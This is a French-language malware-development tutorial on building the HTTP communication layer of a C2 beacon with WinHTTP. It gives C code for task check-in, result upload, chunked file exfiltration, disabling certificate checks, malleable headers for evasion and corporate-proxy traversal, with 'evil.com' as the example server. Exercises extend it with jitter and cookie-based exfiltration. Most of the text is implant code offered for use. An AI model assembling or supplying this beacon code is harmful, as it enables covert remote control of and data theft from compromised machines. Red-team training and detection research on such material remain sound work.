# HTTP Client WinHTTP - Communication C2

## Objectif
Comprendre l'implémentation d'un client HTTP pour communication C2 (Command & Control). Base de tout beacon moderne : Cobalt Strike, Metasploit, Sliver.

## Prérequis
- Bases Windows API
- Notions réseau (HTTP, TCP, TLS)
- Compilation avec MSVC/MinGW

---

## Théorie

### WinHTTP vs WinINet vs Sockets raw

| API | Usage | Avantages | Inconvénients |
|-----|-------|-----------|---------------|
| **WinHTTP** | C2 pro | Proxy auto, async, serveurs | Plus gros binaire |
| **WinINet** | C2 simple | Cache IE, cookies auto | Lié au profil user |
| **Winsock** | Custom proto | Contrôle total | Pas de proxy auto |

**Choix pour C2 :** WinHTTP - gère automatiquement les proxys d'entreprise, TLS, et redirections.

### Flow WinHTTP

```
WinHttpOpen()          → Crée une session
    ↓
WinHttpConnect()       → Connexion au serveur
    ↓
WinHttpOpenRequest()   → Prépare la requête GET/POST
    ↓
WinHttpSendRequest()   → Envoie la requête
    ↓
WinHttpReceiveResponse() → Attend la réponse
    ↓
WinHttpReadData()      → Lit le body
    ↓
WinHttpCloseHandle()   → Cleanup (×3)
```

---

## Analyse du code `raw_maldev.c`

### Section 1 : Structure de config

```c
#pragma pack(push,1)
typedef struct {
    WCHAR host[128];    // C2 server hostname
    WORD  port;         // Port (80, 443, 8080...)
    WCHAR uri[64];      // URI de callback (/api/v1, /jquery.js...)
    WCHAR ua[256];      // User-Agent
    BOOL  ssl;          // HTTPS ou HTTP
} HTTP_CFG;
#pragma pack(pop)
```

**Pourquoi WCHAR ?** WinHTTP utilise des strings Unicode (wide chars). Toutes les fonctions sont en version `W` (Wide).

**Pourquoi cette structure ?** Centralise la config C2. Peut être :
- Hardcodée dans le binaire
- Chiffrée dans une section custom
- Reçue du stager initial

---

### Section 2 : HTTP GET

```c
BOOL http_get(HTTP_CFG* cfg, WCHAR* uri, BYTE** out, DWORD* len)
{
    HINTERNET hS = 0, hC = 0, hR = 0;
    BOOL ret = 0;

    // 1. Session - contexte global
    hS = WinHttpOpen(
        cfg->ua,    // User-Agent
        0,          // WINHTTP_ACCESS_TYPE_DEFAULT_PROXY
        0,          // Proxy (NULL = auto)
        0,          // ProxyBypass (NULL = auto)
        0);         // Flags (0 = sync)

    if(!hS) goto end;
```

**`WinHttpOpen` paramètres :**

| Param | Valeur | Signification |
|-------|--------|---------------|
| User-Agent | `cfg->ua` | Identification du client |
| Access Type | `0` | Utilise les paramètres proxy du système |
| Proxy | `NULL` | Détection automatique (WPAD, PAC, IE settings) |
| Flags | `0` | Mode synchrone (bloquant) |

**Pourquoi proxy auto ?** En entreprise, le trafic passe souvent par un proxy. Sans ça, le beacon ne peut pas sortir.

```c
    // 2. Connexion au host
    hC = WinHttpConnect(
        hS,           // Session handle
        cfg->host,    // Hostname (ex: L"evil.com")
        cfg->port,    // Port
        0);           // Reserved
```

**Note :** `WinHttpConnect` ne fait PAS de connexion TCP. C'est juste une association logique host:port.

```c
    // 3. Prépare la requête
    DWORD flags = cfg->ssl ? 0x800000 : 0;  // WINHTTP_FLAG_SECURE
    hR = WinHttpOpenRequest(
        hC,           // Connection handle
        L"GET",       // Méthode HTTP
        uri,          // URI (ex: L"/api/beacon")
        0,            // HTTP/1.1 par défaut
        0,            // Referer (NULL)
        0,            // Accept types (NULL = */*)
        flags);       // Flags SSL
```

**Flag `WINHTTP_FLAG_SECURE` (0x800000) :** Active TLS/SSL. Sans ce flag sur HTTPS = erreur.

```c
    // 4. Ignore les erreurs de certificat (CRITIQUE pour C2)
    if(cfg->ssl) {
        DWORD sslf = 0x3300;  // SECURITY_FLAG_IGNORE_ALL_CERT_ERRORS
        WinHttpSetOption(hR, 31, &sslf, sizeof(sslf));
    }
```

**Valeur `0x3300` décomposée :**
- `0x0100` : SECURITY_FLAG_IGNORE_UNKNOWN_CA
- `0x0200` : SECURITY_FLAG_IGNORE_CERT_DATE_INVALID
- `0x1000` : SECURITY_FLAG_IGNORE_CERT_CN_INVALID
- `0x2000` : SECURITY_FLAG_IGNORE_CERT_WRONG_USAGE

**Pourquoi ignorer les erreurs cert ?** Le C2 utilise souvent un certificat self-signed ou un domaine différent (domain fronting).

**Option 31 = `WINHTTP_OPTION_SECURITY_FLAGS`**

```c
    // 5. Envoie la requête
    if(!WinHttpSendRequest(hR, 0, 0, 0, 0, 0, 0)) goto end;

    // 6. Attend la réponse complète
    if(!WinHttpReceiveResponse(hR, 0)) goto end;
```

**`WinHttpSendRequest` paramètres :**
```c
WinHttpSendRequest(
    hR,         // Request handle
    NULL,       // Additional headers
    0,          // Headers length (-1 si null-terminated)
    NULL,       // Optional data (body POST)
    0,          // Optional length
    0,          // Total length
    0);         // Context
```

```c
    // 7. Lecture du body en chunks
    DWORD sz = 0, dl = 0, total = 0;
    *out = 0;

    do {
        sz = 0;
        WinHttpQueryDataAvailable(hR, &sz);  // Combien de bytes dispo ?
        if(!sz) break;

        // Réallocation dynamique
        *out = *out
            ? HeapReAlloc(GetProcessHeap(), 0, *out, total + sz + 1)
            : HeapAlloc(GetProcessHeap(), 0, sz + 1);

        WinHttpReadData(hR, *out + total, sz, &dl);
        total += dl;
    } while(sz);

    if(*out) (*out)[total] = 0;  // Null-terminate
    *len = total;
    ret = 1;
```

**Pourquoi HeapAlloc plutôt que malloc ?**
- Pas de dépendance CRT
- Moins de symbols dans le binaire
- Plus "raw" / bas niveau

**Pattern de lecture :**
1. `QueryDataAvailable` → retourne bytes disponibles (peut être < total)
2. `ReadData` → lit ce qui est disponible
3. Loop jusqu'à sz == 0

```c
end:
    if(hR) WinHttpCloseHandle(hR);
    if(hC) WinHttpCloseHandle(hC);
    if(hS) WinHttpCloseHandle(hS);
    return ret;
}
```

**Ordre de fermeture :** Request → Connection → Session (inverse de l'ouverture).

---

### Section 3 : HTTP POST

```c
BOOL http_post(HTTP_CFG* cfg, WCHAR* uri, BYTE* data, DWORD dlen,
               BYTE** out, DWORD* olen)
{
    // ... setup identique à GET ...

    WCHAR hdr[] = L"Content-Type: application/octet-stream\r\n";

    if(!WinHttpSendRequest(hR,
        hdr,        // Headers additionnels
        -1,         // -1 = calcule la longueur (null-terminated)
        data,       // Body data
        dlen,       // Body length
        dlen,       // Total content length
        0)) goto end;

    // ... reste identique ...
}
```

**Content-Type courants pour C2 :**
- `application/octet-stream` : Binaire brut (le plus simple)
- `application/json` : Si le C2 utilise JSON
- `image/png` : Exfiltration cachée dans des images
- `text/html` : Blending avec trafic web normal

---

### Section 4 : Requête custom (malleable)

```c
BOOL http_custom(HTTP_CFG* cfg, WCHAR* method, WCHAR* uri, WCHAR* headers,
                 BYTE* data, DWORD dlen, BYTE** out, DWORD* olen)
{
    // ...
    hR = WinHttpOpenRequest(hC, method, uri, 0, 0, 0, flags);

    if(headers) {
        WinHttpAddRequestHeaders(hR, headers, -1,
            0x20000000 |  // WINHTTP_ADDREQ_FLAG_ADD
            0x80000000);  // WINHTTP_ADDREQ_FLAG_REPLACE
    }
    // ...
}
```

**Pourquoi "malleable" ?** Référence aux [Cobalt Strike Malleable C2 Profiles](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2_main.htm).

Permet de customiser :
- Méthode HTTP (GET, POST, PUT, OPTIONS...)
- Headers custom (X-Forwarded-For, Cookie, Authorization...)
- URI patterns

**Exemple profile Cobalt Strike :**
```
http-get {
    set uri "/api/v1/updates";
    client {
        header "X-API-Key" "abc123";
        header "Accept" "application/json";
    }
}
```

---

### Section 5 : Base64 encode

```c
static const char b64[] = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/";

void b64_enc(BYTE* in, DWORD inlen, char* out)
{
    DWORD i, j = 0;
    for(i = 0; i < inlen; i += 3) {
        // Pack 3 bytes en 1 DWORD (24 bits)
        DWORD n = (in[i] << 16) |
                  ((i+1 < inlen ? in[i+1] : 0) << 8) |
                  (i+2 < inlen ? in[i+2] : 0);

        // Extrait 4 groupes de 6 bits
        out[j++] = b64[(n >> 18) & 63];  // bits 18-23
        out[j++] = b64[(n >> 12) & 63];  // bits 12-17
        out[j++] = (i+1 < inlen) ? b64[(n >> 6) & 63] : '=';  // bits 6-11
        out[j++] = (i+2 < inlen) ? b64[n & 63] : '=';         // bits 0-5
    }
    out[j] = 0;
}
```

**Pourquoi base64 inline ?**
- Pas de dépendance CRT (atob, btoa)
- Contrôle total sur l'implémentation
- Peut être modifié pour custom encoding (base64url, etc.)

**Algorithme :**
```
Input:  3 bytes = 24 bits
Output: 4 chars de 6 bits chacun (64 valeurs possibles = 'A'-'Z','a'-'z','0'-'9','+','/')
```

---

### Section 6 : Beacon pattern

```c
typedef struct {
    WCHAR get_uri[64];      // URI pour check-in (GET tasks)
    WCHAR post_uri[64];     // URI pour output (POST results)
    WCHAR cookie_name[32];  // Nom du cookie (pour ID)
    int   transform;        // 0=raw, 1=base64
} PROFILE;

BOOL beacon_checkin(HTTP_CFG* cfg, PROFILE* prof,
                    BYTE* id, DWORD idlen,
                    BYTE** task, DWORD* tasklen)
{
    WCHAR uri[256];
    char b64id[128];

    if(prof->transform == 1) {
        // Encode l'ID en base64
        b64_enc(id, idlen, b64id);
        // Converti en wide string
        WCHAR wb64[128];
        MultiByteToWideChar(CP_UTF8, 0, b64id, -1, wb64, 128);
        // Construit l'URI: /api/v1?id=SGVsbG8=
        wsprintfW(uri, L"%s%s", prof->get_uri, wb64);
    } else {
        lstrcpyW(uri, prof->get_uri);
    }

    return http_get(cfg, uri, task, tasklen);
}
```

**Flow beacon standard :**
```
1. Check-in (GET)
   Beacon → C2: "Je suis là, ID=XXX, donne-moi des tâches"
   C2 → Beacon: "Exécute: whoami" (ou vide si pas de tâche)

2. Task execution
   Beacon exécute la commande localement

3. Output (POST)
   Beacon → C2: "Résultat de whoami: DESKTOP-XXX\Admin"
   C2 → Beacon: "OK" (ou nouvelle tâche)

4. Sleep
   Beacon attend X secondes (+ jitter aléatoire)

5. Retour à 1
```

---

### Section 7 : Chunked transfer

```c
BOOL http_chunked(HTTP_CFG* cfg, WCHAR* uri, BYTE* data, DWORD total)
{
    // ...
    WinHttpAddRequestHeaders(hR, L"Transfer-Encoding: chunked", -1, 0x20000000);

    // Envoie sans content-length (chunked)
    if(!WinHttpSendRequest(hR, 0, 0, 0, 0, -1L, 0)) goto end;
    //                                        ^^^ -1 = chunked

    DWORD chunk = 4096, sent = 0;
    while(sent < total) {
        DWORD to_send = min(chunk, total - sent);
        DWORD wr;
        if(!WinHttpWriteData(hR, data + sent, to_send, &wr)) goto end;
        sent += wr;
    }

    ret = WinHttpReceiveResponse(hR, 0);
    // ...
}
```

**Pourquoi chunked ?**
1. **Exfiltration large** : Envoi de fichiers volumineux sans connaître la taille totale
2. **Streaming** : Envoi progressif pendant l'exécution
3. **Évasion** : Certains proxys/IDS ont du mal avec chunked

**Format HTTP chunked :**
```
POST /upload HTTP/1.1
Transfer-Encoding: chunked

1000\r\n
[4096 bytes]\r\n
1000\r\n
[4096 bytes]\r\n
0\r\n
\r\n
```

---

### Section 8 : Proxy support

```c
BOOL http_via_proxy(WCHAR* proxy, HTTP_CFG* cfg, WCHAR* uri,
                    BYTE** out, DWORD* len)
{
    hS = WinHttpOpen(cfg->ua,
        3,              // WINHTTP_ACCESS_TYPE_NAMED_PROXY
        proxy,          // "proxy.corp.local:8080"
        L"<local>",     // Bypass pour adresses locales
        0);
    // ...
}
```

**Access types :**

| Valeur | Constante | Comportement |
|--------|-----------|--------------|
| 0 | DEFAULT_PROXY | Utilise IE/système settings |
| 1 | NO_PROXY | Connexion directe |
| 3 | NAMED_PROXY | Proxy spécifié explicitement |

**Bypass `<local>` :** Les adresses comme `localhost`, `127.0.0.1`, noms NetBIOS ne passent pas par le proxy.

---

## Magic Numbers Récapitulatif

| Valeur | Constante | Où |
|--------|-----------|-----|
| `0x800000` | WINHTTP_FLAG_SECURE | OpenRequest flags |
| `0x3300` | SECURITY_FLAG_IGNORE_ALL_CERT_ERRORS | SetOption |
| `31` | WINHTTP_OPTION_SECURITY_FLAGS | SetOption optionId |
| `0x20000000` | WINHTTP_ADDREQ_FLAG_ADD | AddRequestHeaders |
| `0x80000000` | WINHTTP_ADDREQ_FLAG_REPLACE | AddRequestHeaders |
| `3` | WINHTTP_ACCESS_TYPE_NAMED_PROXY | Open accessType |
| `-1L` (total_length) | Chunked transfer | SendRequest |

---

## Références

### Documentation officielle
- [WinHTTP Reference - Microsoft](https://learn.microsoft.com/en-us/windows/win32/winhttp/winhttp-reference)
- [WinHttpOpen](https://learn.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpopen)
- [WinHttpSetOption](https://learn.microsoft.com/en-us/windows/win32/api/winhttp/nf-winhttp-winhttpsetoption)

### Analyse C2
- [Cobalt Strike Malleable C2](https://hstechdocs.helpsystems.com/manuals/cobaltstrike/current/userguide/content/topics/malleable-c2_main.htm)
- [Sliver C2 HTTP(S)](https://github.com/BishopFox/sliver/wiki/HTTP(S)-C2)
- [Detecting C2 over HTTP(S) - SANS](https://www.sans.org/white-papers/36667/)

### Outils
- [Fiddler](https://www.telerik.com/fiddler) - HTTP debugger
- [Wireshark](https://www.wireshark.org/) - Packet capture
- [Burp Suite](https://portswigger.net/burp) - Web proxy

---

## Exercices

### Exercice 1 : Ajouter l'authentification proxy
Modifie `http_via_proxy` pour supporter l'authentification NTLM/Basic.

Indice : `WinHttpSetCredentials(hR, WINHTTP_AUTH_TARGET_PROXY, ...)`

### Exercice 2 : Implémenter un jitter
Ajoute un sleep aléatoire entre les requêtes :
```c
void sleep_jitter(DWORD base_ms, DWORD jitter_percent);
// sleep_jitter(60000, 20) → sleep entre 48s et 72s
```

### Exercice 3 : Exfiltration via Cookie
Modifie `beacon_checkin` pour envoyer l'ID dans un header Cookie au lieu de l'URI.

### Exercice 4 : Detect proxy settings
Écris une fonction qui détecte automatiquement le proxy configuré sur la machine (WPAD, PAC file, IE settings).

Indice : `WinHttpGetIEProxyConfigForCurrentUser()` et `WinHttpGetProxyForUrl()`

---

## Résumé

| Fonction | Usage C2 |
|----------|----------|
| `http_get` | Check-in, récupérer les tâches |
| `http_post` | Envoyer les résultats, exfiltration |
| `http_custom` | Malleable profiles, évasion |
| `http_chunked` | Large file exfiltration |
| `http_via_proxy` | Bypass réseau d'entreprise |
| `b64_enc` | Encoding data pour transport HTTP |
